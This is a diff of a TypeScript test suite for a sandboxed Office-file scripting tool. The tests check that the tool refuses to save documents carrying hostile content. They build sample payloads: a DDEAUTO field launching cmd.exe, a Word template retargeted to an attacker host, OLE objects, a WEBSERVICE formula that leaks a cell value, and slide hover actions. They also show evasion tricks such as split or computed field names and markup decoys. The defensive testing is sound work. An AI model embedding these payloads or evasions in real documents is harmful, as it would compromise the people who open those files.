@@ -7,7 +7,7 @@ import { validateToolArguments } from '@earendil-works/pi-ai'
 import { toPiAgentTools } from '@shared/agent-core/mcp-tools'
 import { DOMParser } from '@xmldom/xmldom'
 import type { JSONValue } from 'ai'
-import { strToU8, zipSync } from 'fflate'
+import { strFromU8, strToU8, unzipSync, zipSync } from 'fflate'
 import JSZip from 'jszip'
 import mammoth from 'mammoth'
 import { docxMime, pptxMime } from '@/files/transformers'
@@ -851,13 +851,13 @@ describe.each([
   })
 
   it('refuses a remote template, an external link or an OLE object the script added, but keeps the ones the file had', async () => {
-    const relationships = (type: string, external: boolean) =>
-      `<Relationships xmlns="urn:r"><Relationship Id="r1" Type="urn:t/${type}" Target="https://example.com/x"${external ? ' TargetMode="External"' : ''}/></Relationships>`
-    const withRelationship = (type: string, external: boolean, text = '') =>
+    const relationships = (type: string, external: boolean, target = 'https://example.com/x') =>
+      `<Relationships xmlns="urn:r"><Relationship Id="r1" Type="urn:t/${type}" Target="${target}"${external ? ' TargetMode="External"' : ''}/></Relationships>`
+    const withRelationship = (type: string, external: boolean, target?: string) =>
       zipSync({
         '[Content_Types].xml': strToU8('<Types/>'),
-        'word/document.xml': strToU8(`<w:document xmlns:w="urn:w">${text}</w:document>`),
-        'word/_rels/settings.xml.rels': strToU8(relationships(type, external)),
+        'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+        'word/_rels/settings.xml.rels': strToU8(relationships(type, external, target)),
       })
     const plain = storeAttachment('plain.docx', zipWith('<w:document xmlns:w="urn:w"/>'))
     const added = [
@@ -881,6 +881,197 @@ describe.each([
     expect(
       (await okFiles(call({ listThreadFiles: async () => [template] }, script, ['template.docx']))).files,
     ).toHaveLength(1)
+    const retargeted = `
+const parts = fflate.unzipSync(readFile('template.docx'))
+const rels = fflate.strFromU8(parts['word/_rels/settings.xml.rels'])
+parts['word/_rels/settings.xml.rels'] = fflate.strToU8(rels.replace('https://example.com/x', 'http://attacker.invalid/t.dotm'))
+saveFile('template.docx', fflate.zipSync(parts))
+`
+    const result = await call({ listThreadFiles: async () => [template] }, retargeted, ['template.docx'])
+    expect(result.ok ? '' : result.error).toStartWith(
+      '"template.docx" was not saved: the script added a template linked from outside the file, which Word downloads when the file opens, in word/_rels/settings.xml.rels, and no file it read had the same one unchanged.',
+    )
+  })
+
+  it('keeps an OLE object or imported chunk only when its bytes are those of one a file it read had', async () => {
+    const relationshipTypes = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
+    const rels = (type: string, target: string) =>
+      strToU8(
+        `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="${relationshipTypes}/${type}" Target="${target}"/></Relationships>`,
+      )
+    const errorOfCall = async (deps: OfficeScriptToolDeps, script: string, inputs?: string[]) => {
+      const result = await call(deps, script, inputs)
+      return result.ok ? '' : result.error
+    }
+    const report = storeAttachment(
+      'report.docx',
+      zipSync({
+        'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+        'word/_rels/document.xml.rels': rels('oleObject', 'embeddings/oleObject1.bin'),
+        'word/embeddings/oleObject1.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 1]),
+      }),
+    )
+    const deps = { listThreadFiles: async () => [report] }
+    const changed = `
+const parts = fflate.unzipSync(readFile('report.docx'))
+parts['word/embeddings/oleObject1.bin'] = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 2])
+saveFile('report.docx', fflate.zipSync(parts))
+`
+    expect(await errorOfCall(deps, changed, ['report.docx'])).toStartWith(
+      '"report.docx" was not saved: the script added an OLE object, which can run a program when it is opened, in word/embeddings/oleObject1.bin,',
+    )
+    const kept = `saveFile('report.docx', ${editedCopy('report.docx')})`
+    expect((await okFiles(call(deps, kept, ['report.docx']))).files).toHaveLength(1)
+
+    // The same bytes in a file it read do not count when that file held them as something else, such as an earlier
+    // output's unused part.
+    const blob = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 7])
+    const earlier = storeAttachment(
+      'earlier.docx',
+      zipSync({ 'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'), 'word/media/blob.bin': blob }),
+    )
+    const smuggled = zipSync({
+      'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+      'word/_rels/document.xml.rels': rels('oleObject', 'embeddings/oleObject1.bin'),
+      'word/embeddings/oleObject1.bin': blob,
+    })
+    const reused = `readFile('earlier.docx'); saveFile('smuggled.docx', new Uint8Array([${smuggled.join(',')}]))`
+    expect(await errorOfCall({ listThreadFiles: async () => [earlier] }, reused, ['earlier.docx'])).toStartWith(
+      '"smuggled.docx" was not saved: the script added an OLE object, which can run a program when it is opened, in word/embeddings/oleObject1.bin,',
+    )
+
+    // A Word part no longer makes a deck pass for a Word file that may keep OLE objects like the user's.
+    const deck = zipSync({
+      'ppt/slides/slide1.xml': strToU8('<p:sld xmlns:p="urn:p"/>'),
+      'ppt/slides/_rels/slide1.xml.rels': rels('oleObject', '../embeddings/oleObject1.bin'),
+      'ppt/embeddings/oleObject1.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 3]),
+      'word/x.xml': strToU8('<x/>'),
+    })
+    const laundered = `readFile('report.docx'); saveFile('deck.pptx', new Uint8Array([${deck.join(',')}]))`
+    expect(await errorOfCall(deps, laundered, ['report.docx'])).toStartWith(
+      '"deck.pptx" was not saved: the script added an OLE object, which can run a program when it is opened, in ppt/embeddings/oleObject1.bin,',
+    )
+
+    const chunk = zipSync({
+      'word/document.xml': strToU8(
+        `<w:document xmlns:w="urn:w" xmlns:r="${relationshipTypes}"><w:body><w:altChunk r:id="r1"/></w:body></w:document>`,
+      ),
+      'word/_rels/document.xml.rels': rels('aFChunk', 'afchunk.rtf'),
+      'word/afchunk.rtf': strToU8('{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE "https://example.com/a.png"}}}'),
+    })
+    expect(await errorOfCall({}, `saveFile('chunk.docx', new Uint8Array([${chunk.join(',')}]))`)).toStartWith(
+      '"chunk.docx" was not saved: the script added an imported chunk (w:altChunk) of RTF, HTML or another document, which Word merges in when the file opens and this tool cannot check, in word/afchunk.rtf,',
+    )
+  })
+
+  it('checks a document embedded in a deck like the file itself, unless a file it read had it unchanged', async () => {
+    const withPackage = (name: string, bytes: string) => `
+const pres = new PptxGenJS()
+pres.addSlide().addText('Embedded', { x: 1, y: 1, w: 4, h: 1 })
+const parts = fflate.unzipSync(await pres.write({ outputType: 'uint8array' }))
+const rels = fflate.strFromU8(parts['ppt/slides/_rels/slide1.xml.rels'])
+parts['ppt/slides/_rels/slide1.xml.rels'] = fflate.strToU8(rels.replace('</Relationships>', '<Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="../embeddings/${name}"/></Relationships>'))
+const bytes = ${bytes}
+if (bytes) parts['ppt/embeddings/${name}'] = bytes
+saveFile('deck.pptx', fflate.zipSync(parts))
+`
+    const macroBook = `fflate.zipSync({
+  '[Content_Types].xml': fflate.strToU8('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'),
+  'xl/workbook.xml': fflate.strToU8('<workbook xmlns="urn:x"/>'),
+  'xl/vbaProject.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
+})`
+    const templateDocument = `fflate.zipSync({
+  'word/document.xml': fflate.strToU8('<w:document xmlns:w="urn:w"/>'),
+  'word/_rels/settings.xml.rels': fflate.strToU8('<Relationships xmlns="urn:r"><Relationship Id="r1" Type="urn:t/attachedTemplate" Target="https://example.com/t.dotm" TargetMode="External"/></Relationships>'),
+})`
+    const cases = [
+      ['Book.xlsm', macroBook, 'added or changed the macros in ppt/embeddings/Book.xlsm: xl/vbaProject.bin.'],
+      [
+        'Doc.docx',
+        templateDocument,
+        'added a template linked from outside the file, which Word downloads when the file opens, in ppt/embeddings/Doc.docx: word/_rels/settings.xml.rels,',
+      ],
+      [
+        'Broken.docx',
+        'new Uint8Array([1, 2, 3])',
+        'added an embedded Office document this tool could not find or open to check, in ppt/embeddings/Broken.docx,',
+      ],
+      [
+        'Missing.docx',
+        'undefined',
+        'added an embedded Office document this tool could not find or open to check, in ppt/slides/_rels/slide1.xml.rels,',
+      ],
+    ]
+    for (const [name, bytes, refusal] of cases) {
+      const result = await run(withPackage(name, bytes))
+      expect(result.ok ? '' : result.error).toStartWith(`"deck.pptx" was not saved: the script ${refusal}`)
+    }
+  })
+
+  it('refuses a formula that fetches outside data in the workbook behind a chart', async () => {
+    const error = await errorOf(`
+const pres = new PptxGenJS()
+pres.addSlide().addChart(pres.ChartType.bar, [{ name: 'Sales', labels: ['Q1', 'Q2'], values: [10, 20] }], { x: 1, y: 1, w: 6, h: 3 })
+const parts = fflate.unzipSync(await pres.write({ outputType: 'uint8array' }))
+const book = fflate.unzipSync(parts['ppt/embeddings/Microsoft_Excel_Worksheet1.xlsx'])
+const sheet = fflate.strFromU8(book['xl/worksheets/sheet1.xml'])
+book['xl/worksheets/sheet1.xml'] = fflate.strToU8(sheet.replace('</sheetData>', '<row r="9"><c r="A9"><f>_xlfn.WEBSERVICE("https://example.com/?q="&amp;B2)</f></c></row></sheetData>'))
+parts['ppt/embeddings/Microsoft_Excel_Worksheet1.xlsx'] = fflate.zipSync(book)
+saveFile('deck.pptx', fflate.zipSync(parts))
+`)
+    expect(error).toStartWith(
+      '"deck.pptx" was not saved: the script added a formula that fetches data from outside the file (WEBSERVICE, IMAGE, RTD or an IMPORT function), which Excel or Google Sheets runs when the workbook calculates, in ppt/embeddings/Microsoft_Excel_Worksheet1.xlsx: xl/worksheets/sheet1.xml ("_xlfn.WEBSERVICE(\\"https://example.com/?q=\\"&B2)"), and no file it read had the same one unchanged.',
+    )
+  })
+
+  it('refuses a mouse-over action or an OLE verb command the script added, but keeps a slide the user had', async () => {
+    const linkedDeck = (patch: string) => `
+const pres = new PptxGenJS()
+pres.addSlide().addText([{ text: 'Open', options: { hyperlink: { url: 'https://example.com/' } } }], { x: 1, y: 1, w: 4, h: 1 })
+const parts = fflate.unzipSync(await pres.write({ outputType: 'uint8array' }))
+const slide = fflate.strFromU8(parts['ppt/slides/slide1.xml'])
+parts['ppt/slides/slide1.xml'] = fflate.strToU8(${patch})
+saveFile('deck.pptx', fflate.zipSync(parts))
+`
+    const hover = `.replace(/<p:cNvPr ([^>]*?)\\/>/, '<p:cNvPr $1><a:hlinkHover r:id="" action="ppaction://noaction"/></p:cNvPr>')`
+    const verb =
+      '<p:timing><p:tnLst><p:par><p:cTn id="1"><p:childTnLst><p:cmd type="verb" cmd="0"><p:cBhvr><p:cTn id="2" dur="1"/><p:tgtEl><p:spTgt spid="2"/></p:tgtEl></p:cBhvr></p:cmd></p:childTnLst></p:cTn></p:par></p:tnLst></p:timing>'
+    for (const patch of [
+      `slide.replaceAll('hlinkClick', 'hlinkMouseOver')`,
+      `slide${hover}`,
+      `slide.replace('</p:sld>', '${verb}</p:sld>')`,
+    ]) {
+      expect(await errorOf(linkedDeck(patch))).toStartWith(
+        '"deck.pptx" was not saved: ppt/slides/slide1.xml holds a mouse-over action or an OLE verb command, which PowerPoint runs during a slide show without a click, and no file the script read had that part and its relationships byte for byte.',
+      )
+    }
+
+    const parts = unzipSync(await fixture('SampleShow.pptx'))
+    const slide = strFromU8(parts['ppt/slides/slide1.xml'])
+    parts['ppt/slides/slide1.xml'] = strToU8(
+      slide.replace(
+        /<p:cNvPr ([^>]*?)\/>/,
+        '<p:cNvPr $1><a:hlinkHover r:id="" action="ppaction://noaction"/></p:cNvPr>',
+      ),
+    )
+    const show = storeAttachment('show.pptx', zipSync(parts))
+    const deps = { listThreadFiles: async () => [show] }
+    const edit = (change: string) => `
+const parts = fflate.unzipSync(readFile('show.pptx'))
+${change}
+saveFile('show.pptx', fflate.zipSync(parts))
+`
+    const otherSlide = `parts['ppt/slides/slide2.xml'] = fflate.strToU8(fflate.strFromU8(parts['ppt/slides/slide2.xml']) + '<!-- edited -->')`
+    const copied = `parts['ppt/slides/slide9.xml'] = parts['ppt/slides/slide1.xml']`
+    for (const change of [otherSlide, copied]) {
+      expect((await okFiles(call(deps, edit(change), ['show.pptx']))).files).toHaveLength(1)
+    }
+    const sameSlide = `parts['ppt/slides/slide1.xml'] = fflate.strToU8(fflate.strFromU8(parts['ppt/slides/slide1.xml']).replace('FirstSlide', 'Edited'))`
+    const result = await call(deps, edit(sameSlide), ['show.pptx'])
+    // The user's own action is refused once its slide changes, in words that do not blame the script for adding it.
+    expect(result.ok ? '' : result.error).toBe(
+      '"show.pptx" was not saved: ppt/slides/slide1.xml holds a mouse-over action or an OLE verb command, which PowerPoint runs during a slide show without a click, and no file the script read had that part and its relationships byte for byte. Leave both exactly as they were, without parsing and serializing them again, or explain to the user what was refused and why.',
+    )
   })
 
   it('refuses a Word field that fills itself from outside the file, unless the edited file had it', async () => {
@@ -900,7 +1091,7 @@ describe.each([
     ]) {
       const result = await call({}, `saveFile('a.docx', new Uint8Array([${zipWith(document(body)).join(',')}]))`)
       expect(result.ok ? '' : result.error).toStartWith(
-        '"a.docx" was not saved: the script added a field that loads content from outside the file, or whose name another field computes, which Word acts on when the file opens, in word/document.xml',
+        '"a.docx" was not saved: the script added a field that loads content from outside the file, or whose name another field, a tracked change or markup Word skips decides, which Word acts on when the file opens, in word/document.xml (',
       )
     }
 
@@ -914,7 +1105,11 @@ parts['word/document.xml'] = fflate.strToU8(fflate.strFromU8(parts['word/documen
 saveFile('pictures.docx', fflate.zipSync(parts))
 `
     const result = await call(deps, retargeted, ['pictures.docx'])
+    // The refusal quotes the field, so the model can tell the user's own field it changed from one it added.
     expect(result.ok ? '' : result.error).toStartWith('"pictures.docx" was not saved: the script added a field')
+    expect(result.ok ? '' : result.error).toContain(
+      `in word/document.xml (${JSON.stringify('INCLUDEPICTURE "https://example.org/a.png" \\* MERGEFORMATINET')}), and no file`,
+    )
 
     // A part that is XML only by its content type keeps its fields too.
     const mainType = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'
@@ -1248,8 +1443,8 @@ describe('Office script tool description', () => {
   const workspace: ReadWorkspaceFile = async () => ({ status: 'missing' })
 
   it('stays short, since every request sends it', () => {
-    expect(createOfficeScriptTool().description.length).toBeLessThan(1_950)
-    expect(createOfficeScriptTool({ readWorkspaceFile: workspace }).description.length).toBeLessThan(1_950)
+    expect(createOfficeScriptTool().description.length).toBeLessThan(2_100)
+    expect(createOfficeScriptTool({ readWorkspaceFile: workspace }).description.length).toBeLessThan(2_100)
   })
 
   it('tells the model to load the Office skills only when it has some', () => {
@@ -1390,5 +1585,300 @@ describe('findBrokenFile', () => {
     const files = [{ filename: 'a.docx', bytes: zipWith(`<a>${'<b/>'.repeat(10_000)}</a>`) }]
 
     expect(await findBrokenFile(runtime, files, sandboxLimits, performance.now() - 1)).toBe(checkOutOfTime(30))
+  })
+
+  describe('reading Word field codes as Word does', () => {
+    const check = (xml: string, inputs: string[] = []) =>
+      findBrokenFile(
+        runtime,
+        [{ filename: 'a.docx', bytes: zipWith(xml) }],
+        sandboxLimits,
+        performance.now() + 60_000,
+        new Map(),
+        inputs.map((input, index) => ({ name: `input${index}.docx`, bytes: zipWith(input) })),
+      )
+    const wordNamespace = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
+    const document = (body: string, namespace = wordNamespace) =>
+      `<w:document xmlns:w="${namespace}" xmlns:x="urn:x" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x"><w:body><w:p>${body}</w:p></w:body></w:document>`
+    const run = (text: string, tag = 'w:instrText') => `<w:r><${tag} xml:space="preserve">${text}</${tag}></w:r>`
+    const mark = (type: string) => `<w:r><w:fldChar w:fldCharType="${type}"/></w:r>`
+    const field = (...codes: string[]) =>
+      `${mark('begin')}${codes.map((code) => run(code)).join('')}${mark('separate')}${mark('end')}`
+    const deletion = (inner: string) => `<w:del w:id="1" w:author="a" w:date="2026-01-01T00:00:00Z">${inner}</w:del>`
+    const picture = ' INCLUDEPICTURE "https://example.com/a.png" \\d '
+    const dde = 'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"'
+    const ddeRefusal = '"a.docx" has a DDE field in word/document.xml'
+    const fieldRefusal = '"a.docx" was not saved: the script added a field that loads content from outside the file'
+
+    it('refuses a field whose code markup Word skips, a tracked change or a nested field decides', async () => {
+      const alternate = (branch: string) =>
+        `${mark('begin')}<mc:AlternateContent><mc:Choice Requires="x">${run('PAGE ')}</mc:Choice>${branch}</mc:AlternateContent>${mark('separate')}${mark('end')}`
+      const decoys = [
+        [`<w:fldSimple x:instr="PAGE" w:instr="${dde.replaceAll('"', '&quot;')}"/>`, ddeRefusal],
+        [`${mark('begin')}${run('PAGE ', 'x:instrText')}${run(dde)}${mark('separate')}${mark('end')}`, ddeRefusal],
+        [alternate(`<mc:Fallback>${run(dde)}</mc:Fallback>`), ddeRefusal],
+        [
+          `${mark('begin')}${run('PAGE ', 'x:instrText')}${run(picture)}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [
+          `${mark('begin')}<w:r><x:fldChar x:fldCharType="separate"/></w:r>${run(picture)}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [`<w:fldSimple x:instr="PAGE" w:instr="${picture.replaceAll('"', '&quot;')}"/>`, fieldRefusal],
+        [
+          `${mark('begin')}<w:r><w:fldChar x:fldCharType="separate" w:fldCharType="begin"/></w:r>${run(picture)}${mark('separate')}${mark('end')}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [alternate(`<mc:Choice Requires="w">${run(picture)}</mc:Choice>`), fieldRefusal],
+        [
+          `${mark('begin')}${run(' INCLUDEPICT')}${field(' QUOTE 85 82 69 ')}${run(' "https://example.com/a.png" ')}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [
+          `${mark('begin')}${run(' DD')}${field(' QUOTE 69 ')}${run(' "cmd.exe" ')}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [field(' DATABASE \\d "\\\\\\\\host\\\\share\\\\a.mdb" \\s "select * from t" '), fieldRefusal],
+        [field(' RD "\\\\\\\\host\\\\share\\\\a.docx" '), fieldRefusal],
+        [
+          `${mark('begin')}${deletion('<w:r><w:fldChar w:fldCharType="separate"/></w:r>')}${run(dde)}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [
+          `${mark('begin')}${deletion('<w:r><w:delInstrText> INCLUDEPICTURE </w:delInstrText></w:r>')}${run(' "https://example.com/a.png" \\d ')}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        // A mark typed only by an attribute Word does not read, a simple field inside a code, and code text in run
+        // properties, which Word never reads as code.
+        [
+          `${mark('begin')}<w:r><w:fldChar fldCharType="separate"/></w:r>${run(dde)}${mark('separate')}${mark('end')}`,
+          ddeRefusal,
+        ],
+        [
+          `${mark('begin')}<w:r><w:fldChar x:fldCharType="separate"/></w:r>${run(picture)}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [
+          `${mark('begin')}<w:fldSimple w:instr=" QUOTE 68 68 69 "/>${run('AUTO cmd.exe')}${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+        [
+          `${mark('begin')}<w:r><w:rPr><w:instrText> PAGE </w:instrText></w:rPr><w:instrText>${picture}</w:instrText></w:r>${mark('separate')}${mark('end')}`,
+          fieldRefusal,
+        ],
+      ]
+      for (const [body, refusal] of decoys) {
+        expect(await check(document(body))).toStartWith(refusal)
+      }
+    })
+
+    it('saves the fields generated documents hold, in any namespace and pretty-printed', async () => {
+      const wholeDeletion = deletion(
+        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:delInstrText> HYPERLINK "https://example.com" </w:delInstrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>',
+      )
+      for (const namespace of [wordNamespace, 'urn:w']) {
+        for (const body of [
+          `${field(' PAGE ')}${field(' NUMPAGES ')}<w:fldSimple w:instr="PAGE"/>`,
+          field(' HYPERLINK "https://example.com/DDE" '),
+          field(' TOC \\o "1-3" \\h \\z \\u '),
+          `${mark('begin')}${run('={')}${field(' PAGE ')}${run('}+1')}${mark('separate')}${mark('end')}`,
+          `${mark('begin')}${run(' IF ')}${field(' MERGEFIELD x ')}${run(' = 1 "a" "b" ')}${mark('separate')}${mark('end')}`,
+          `${wholeDeletion}<w:r><w:t>x</w:t></w:r>${deletion(mark('end'))}`,
+          `${mark('begin')}<w:r><w:rPr><w:b/></w:rPr><w:instrText> PAGE </w:instrText></w:r>${mark('separate')}${mark('end')}`,
+          `${mark('begin')}<w:r><w:rPr><w:kern w:val="2"/><x:ligatures x:val="standardContextual"/></w:rPr><w:instrText> NUMPAGES </w:instrText></w:r>${mark('separate')}${mark('end')}`,
+          `${mark('begin')}${run(' HYPERLINK "https://example.com/DDE/')}${deletion('<w:r><w:delInstrText>v1</w:delInstrText></w:r>')}${run('v2" ')}${mark('separate')}${mark('end')}`,
+          `\n  ${mark('begin')}\n  <w:r>\n <w:instrText> PAGE </w:instrText>\n</w:r>\n${mark('separate')}${mark('end')}`,
+        ]) {
+          expect(await check(document(body, namespace))).toBeUndefined()
+        }
+      }
+    })
+
+    it('reads a DDE name that markup splits or comes before, and keys a computed field on its nested codes', async () => {
+      for (const body of [
+        field(' DD', 'EAUTO cmd '),
+        `\n  ${mark('begin')}\n  ${run(' DD')}\n  ${run('EAUTO cmd ')}\n  ${mark('separate')}${mark('end')}`,
+        `${mark('begin')}<w:r><w:rPr><x:ligatures/></w:rPr><w:instrText> DDEAUTO cmd </w:instrText></w:r>${mark('separate')}${mark('end')}`,
+        `${field(' DD', 'EAUTO cmd ')}${field(' HYPERLINK "https://example.com/DDE" ')}`,
+      ]) {
+        expect(await check(document(body))).toStartWith(ddeRefusal)
+      }
+
+      const computed = (code: string) =>
+        document(`${mark('begin')}${field(code)}${run(' "cmd" ')}${mark('separate')}${mark('end')}`)
+      expect(await check(computed(' QUOTE 68 68 69 '), [computed(' QUOTE 65 ')])).toStartWith(fieldRefusal)
+      expect(await check(`${computed(' QUOTE 65 ')}<!-- edited -->`, [computed(' QUOTE 65 ')])).toBeUndefined()
+    })
+  })
+
+  describe('reading packages as Office does', () => {
+    const check = (
+      filename: string,
+      bytes: Uint8Array<ArrayBuffer>,
+      inputs: Uint8Array<ArrayBuffer>[] = [],
+      limits = sandboxLimits,
+    ) =>
+      findBrokenFile(
+        runtime,
+        [{ filename, bytes }],
+        limits,
+        performance.now() + 60_000,
+        new Map(),
+        inputs.map((input, index) => ({ name: `input${index}`, bytes: input })),
+      )
+    const relationships = (...items: string[]) =>
+      strToU8(
+        `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.join('')}</Relationships>`,
+      )
+    const relationship = (type: string, target: string, mode = '') =>
+      `<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${mode}/>`
+    const macroBook = zipSync({
+      '[Content_Types].xml': strToU8(
+        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>',
+      ),
+      'xl/workbook.xml': strToU8('<workbook xmlns="urn:x"/>'),
+      'xl/vbaProject.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
+    })
+    const cleanBook = zipSync({ 'xl/workbook.xml': strToU8('<workbook xmlns="urn:x"/>') })
+    const actionRefusal =
+      '"deck.pptx" was not saved: ppt/slides/slide1.xml holds a mouse-over action or an OLE verb command'
+
+    it('resolves a relationship under any case of _rels, a percent-encoded target and a type with spaces', async () => {
+      const deck = zipSync({
+        'ppt/slides/slide1.xml': strToU8('<p:sld xmlns:p="urn:p"/>'),
+        'ppt/slides/_RELS/slide1.xml.rels': relationships(relationship('package', '../embeddings/Book.xlsm')),
+        'ppt/embeddings/Book.xlsm': macroBook,
+        'ppt/slides/embeddings/Book.xlsm': cleanBook,
+      })
+      expect(await check('deck.pptx', deck)).toContain('the macros in ppt/embeddings/Book.xlsm: xl/vbaProject.bin.')
+
+      const embedding = (book: Uint8Array<ArrayBuffer>, text: string) =>
+        zipSync({
+          'word/document.xml': strToU8(`<w:document xmlns:w="urn:w">${text}</w:document>`),
+          'word/_rels/document.xml.rels': relationships(
+            relationship('package', 'embeddings/Microsoft%20Excel%20Worksheet.xlsx'),
+          ),
+          'word/embeddings/Microsoft Excel Worksheet.xlsx': book,
+        })
+      const user = embedding(cleanBook, 'x')
+      expect(await check('a.docx', embedding(cleanBook, 'edited'), [user])).toBeUndefined()
+      expect(await check('a.docx', embedding(macroBook, 'edited'), [user])).toContain(
+        'the macros in word/embeddings/Microsoft Excel Worksheet.xlsx: xl/vbaProject.bin.',
+      )
+
+      const spaced = zipSync({
+        'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+        'word/_rels/document.xml.rels': relationships(
+          relationship('oleObject', 'embeddings/oleObject1.bin').replace('oleObject"', 'oleObject "'),
+        ),
+        'word/embeddings/oleObject1.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0]),
+      })
+      expect(await check('a.docx', spaced)).toStartWith('"a.docx" was not saved: the script added an OLE object')
+    })
+
+    it('keeps a part with a mouse-over action only with its relationships unchanged, and reads a spaced verb', async () => {
+      const hover = (target: string, edit: string) =>
+        zipSync({
+          'ppt/slides/slide1.xml': strToU8(
+            '<p:sld xmlns:p="urn:p" xmlns:a="urn:a" xmlns:r="urn:r"><a:hlinkMouseOver r:id="r1"/></p:sld>',
+          ),
+          'ppt/slides/_rels/slide1.xml.rels': relationships(
+            relationship('hyperlink', target, ' TargetMode="External"'),
+          ),
+          'docProps/app.xml': strToU8(`<Properties>${edit}</Properties>`),
+        })
+      const user = hover('https://example.com/', '')
+      expect(await check('deck.pptx', hover('https://example.com/', 'edited'), [user])).toBeUndefined()
+      expect(await check('deck.pptx', hover('https://attacker.example/', 'edited'), [user])).toStartWith(actionRefusal)
+      const verb = zipSync({
+        'ppt/slides/slide1.xml': strToU8('<p:sld xmlns:p="urn:p"><p:cmd type=" verb" cmd="0"/></p:sld>'),
+      })
+      expect(await check('deck.pptx', verb)).toStartWith(actionRefusal)
+    })
+
+    it('refuses two parts under one name, a package that does not start as a zip, and an encoding it cannot read', async () => {
+      const twice = zipSync({
+        'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+        'Word/Document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+      })
+      expect(await check('a.docx', twice)).toStartWith('"a.docx" has two parts named "Word/Document.xml"')
+
+      // A self-extracting zip: bytes in front, and every offset moved past them.
+      const book = zipSync({
+        'xl/worksheets/sheet1.xml': strToU8(
+          '<worksheet><sheetData><row r="1"><c r="A1"><f>_xlfn.WEBSERVICE("https://example.com/")</f></c></row></sheetData></worksheet>',
+        ),
+      })
+      const prefixed = new Uint8Array(book.length + 1)
+      prefixed.set(book, 1)
+      const view = new DataView(prefixed.buffer)
+      const end = prefixed.length - 22
+      const directory = view.getUint32(end + 16, true) + 1
+      view.setUint32(end + 16, directory, true)
+      view.setUint32(directory + 42, view.getUint32(directory + 42, true) + 1, true)
+      const embedded = zipSync({
+        'word/document.xml': strToU8('<w:document xmlns:w="urn:w"/>'),
+        'word/_rels/document.xml.rels': relationships(relationship('package', 'embeddings/Book.xlsx')),
+        'word/embeddings/Book.xlsx': prefixed,
+      })
+      expect(await check('a.docx', embedded)).toStartWith(
+        '"a.docx" was not saved: the script added an embedded Office document this tool could not find or open to check, in word/embeddings/Book.xlsx,',
+      )
+
+      const utf7 = zipWith(
+        '<?xml version="1.0" encoding="UTF-7"?><w:document xmlns:w="urn:w"><w:fldSimple w:instr=" +AEk-NCLUDEPICTURE &quot;https://example.com/a.png&quot; "/></w:document>',
+      )
+      expect(await check('a.docx', utf7)).toStartWith(
+        '"a.docx" would not open: its part word/document.xml is not valid XML (the XML declaration says encoding="UTF-7", which this check cannot read;',
+      )
+    })
+
+    it("scans neither a Word or PowerPoint file's own parts nor a workbook a file it read had as formulas", async () => {
+      const math = zipSync({
+        '[Content_Types].xml': strToU8(
+          '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
+        ),
+        'word/document.xml': strToU8(
+          '<w:document xmlns:w="urn:w" xmlns:m="urn:m"><m:oMath><m:f><m:num><m:r><m:t>IMAGE(x)</m:t></m:r></m:num><m:den><m:r><m:t>2</m:t></m:r></m:den></m:f></m:oMath></w:document>',
+        ),
+      })
+      expect(await check('a.docx', math)).toBeUndefined()
+
+      // A deck that holds a large embedded workbook, as pasting a range embeds the whole workbook, edited elsewhere.
+      const rows = Array.from(
+        { length: 20_000 },
+        (_, row) => `<row r="${row + 1}"><c r="A${row + 1}"><v>${row}</v></c></row>`,
+      )
+      const book = zipSync({
+        'xl/worksheets/sheet1.xml': strToU8(`<worksheet><sheetData>${rows.join('')}</sheetData></worksheet>`),
+      })
+      const deck = (title: string) =>
+        zipSync({
+          'ppt/slides/slide1.xml': strToU8(`<p:sld xmlns:p="urn:p">${title}</p:sld>`),
+          'ppt/slides/_rels/slide1.xml.rels': relationships(relationship('package', '../embeddings/Book.xlsx')),
+          'ppt/embeddings/Book.xlsx': book,
+          'ppt/media/video.bin': new Uint8Array(mib / 2),
+        })
+      expect(
+        await check('deck.pptx', deck('Edited'), [deck('Title')], { ...sandboxLimits, unzipBytes: mib }),
+      ).toBeUndefined()
+
